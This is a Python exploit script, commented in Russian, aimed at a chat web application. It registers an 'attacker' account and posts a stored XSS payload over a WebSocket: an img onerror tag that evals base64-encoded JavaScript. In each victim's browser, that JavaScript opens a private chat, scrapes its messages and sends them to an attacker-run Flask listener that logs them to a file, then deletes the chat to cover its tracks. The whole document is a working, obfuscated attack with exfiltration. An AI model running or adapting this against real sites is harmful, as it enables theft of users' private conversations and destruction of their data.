import requests
import threading
import time
import logging
import socketio
import base64
from flask import Flask, request

# Настройки
SERVER_URL = "http://127.0.0.1:5000"
ATTACKER_HOST = "127.0.0.1"
ATTACKER_PORT = 8000
ATTACKER_URL = f"http://{ATTACKER_HOST}:{ATTACKER_PORT}"

# Flask-приложение для приема украденных данных
app = Flask(__name__)
stolen_data = []

@app.route('/steal', methods=['GET'])
def steal():
    chat_id = request.args.get('chat_id')
    messages = request.args.get('messages')
    if chat_id and messages:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}]\nChat ID: {chat_id}\nMessages: {messages}\n" + "="*50 + "\n"
        with open('stolen_chats.txt', 'a', encoding='utf-8') as f:
            f.write(entry)
        stolen_data.append({'chat_id': chat_id, 'messages': messages, 'timestamp': timestamp})
    return "OK"

def start_listener():
    app.run(host=ATTACKER_HOST, port=ATTACKER_PORT)

def send_xss_payload():
    time.sleep(2)
    session = requests.Session()
    logging.info("[~] Регистрируемся...")
    # Регистрация
    reg = session.post(f"{SERVER_URL}/register", data={
        'username': 'attacker',
        'password': 'password123'
    })
    if reg.status_code == 200:
        logging.info("[+] Регистрация успешна.")
    else:
        logging.warning("[-] Ошибка при регистрации.")
    # Вход
    login = session.post(f"{SERVER_URL}/login", data={
        'username': 'attacker',
        'password': 'password123'
    })
    if login.status_code == 200:
        logging.info("[+] Вход выполнен.")
    else:
        logging.warning("[-] Ошибка при входе.")
        return

    # Base64-encoded JavaScript код для выполнения XSS
    js_code = """
    async function createPrivateChat() {
        const formData = new URLSearchParams();
        formData.append('password', 'hacked');
        const response = await fetch('/create_private_chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: formData
        });
        const html = await response.text();
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const rows = doc.querySelectorAll('table tr');
        let chatId, chatDbId;
        rows.forEach(row => {
            const tds = row.querySelectorAll('td');
            if (tds.length >= 2) {
                const currentChatId = tds[0].textContent.trim();
                const deleteForm = tds[1].querySelector('form[action^="/delete_chat/"]');
                if (deleteForm) {
                    const dbId = deleteForm.getAttribute('action').split('/').pop();
                    chatId = currentChatId;
                    chatDbId = dbId;
                }
            }
        });
        if (!chatId) return;
        const joinFormData = new URLSearchParams();
        joinFormData.append('chat_id', chatId);
        joinFormData.append('password', 'hacked');
        await fetch('/join_private_chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: joinFormData
        });
        const privateChatResponse = await fetch(`/private_chat/${chatId}`);
        const privateChatHtml = await privateChatResponse.text();
        const privateChatDoc = parser.parseFromString(privateChatHtml, 'text/html');
        const messages = Array.from(privateChatDoc.querySelectorAll('#chat p')).map(p => p.textContent);
        fetch('%s/steal?chat_id=' + encodeURIComponent(chatId) + '&messages=' + encodeURIComponent(JSON.stringify(messages)));
        await fetch(`/delete_chat/${chatDbId}`, { method: 'GET' });
        window.location.replace('/chat');
    }
    createPrivateChat();
    """ % ATTACKER_URL

    # Минифицируем и кодируем код в base64
    js_code = js_code.replace('\n', '').replace('    ', '')
    encoded_js = base64.b64encode(js_code.encode()).decode()

    # Создаем XSS payload с использованием тега img
    xss_payload = f'<img src=x onerror="eval(atob(\'{encoded_js}\'))">'

    try:
        sio = socketio.Client()
        sio.connect(SERVER_URL)
        sio.emit('join', {'room': 'general', 'username': 'attacker'})
        sio.emit('send_message', {
            'room': 'general',
            'username': 'attacker',
            'message': xss_payload
        })
        logging.info("[+] XSS payload отправлен через WebSocket")
        sio.disconnect()
    except Exception as e:
        logging.warning(f"[-] Ошибка при отправке XSS через сокет: {e}")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    # Слушаем украденные данные
    threading.Thread(target=start_listener, daemon=True).start()
    # Отправляем XSS
    send_xss_payload()
    logging.info("Эксплойт активен. Ожидаем подключений жертв...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Эксплойт остановлен пользователем.")
